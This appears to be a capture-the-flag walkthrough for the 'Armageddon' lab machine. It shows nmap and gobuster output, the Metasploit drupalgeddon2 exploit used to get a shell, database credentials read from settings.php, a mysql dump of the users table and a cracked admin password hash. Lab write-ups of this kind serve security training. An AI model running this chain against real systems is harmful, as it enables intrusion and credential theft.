First what we nned to do is RECON, to recognaiz what's running on the server! Let's start with nmap 

```
┌──(kali㉿kali)-[~]
└─$ nmap -sCV 10.10.10.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-05 12:20 EDT
Nmap scan report for 10.10.10.233
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
```

We can't see there any intresting port, only standard port SSH and HTTP
I turn on the gobuster, found robots.txt but there is any intresting directory/information

Here's results from gobuster
```
/.hta                 (Status: 403) [Size: 206]
/.hta.php             (Status: 403) [Size: 210]
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htaccess.php        (Status: 403) [Size: 215]
/cgi-bin/             (Status: 403) [Size: 210]
/cron.php             (Status: 403) [Size: 7388]
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/index.php            (Status: 200) [Size: 7440]
/index.php            (Status: 200) [Size: 7440]
/install.php          (Status: 200) [Size: 3172]
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/robots.txt           (Status: 200) [Size: 2189]
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
/update.php           (Status: 403) [Size: 4057]
/web.config           (Status: 200) [Size: 2200]
/xmlrpc.php           (Status: 200) [Size: 42]
/xmlrpc.php           (Status: 200) [Size: 42]
```
But in directory /install.php i found more istresting think ```Drupal already installed``` i found some intresting modul in metasploit ```exploit(unix/webapp/drupal_drupalgeddon2)``` and i insert missing data RHOST, LHOST and i got the meterpreter.

![obraz](https://github.com/Anogota/Armageddon/assets/143951834/304bc908-e3b7-49ed-9cbd-efa733b25d7b)

in the meterpreter i wrote shell and i got it ```id uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0``` i found something intresting on hacktricks about the drupal how to dump all database, but i need the password to dump it. I found the password on the server.
Here you can find the creds /var/www/html/sites/default/settings.php
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
Now when we have the password we can try to dump the database
```
mysql -u drupaluser --password='CQHEy@9M*m23gBVj' -e 'use drupal; select * from users'
```
and i got the username and hash 
```
brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```
Let's crack this hash with help johntheripper
```echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' >> hash.txt```
```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
And you got the password ```booboo```
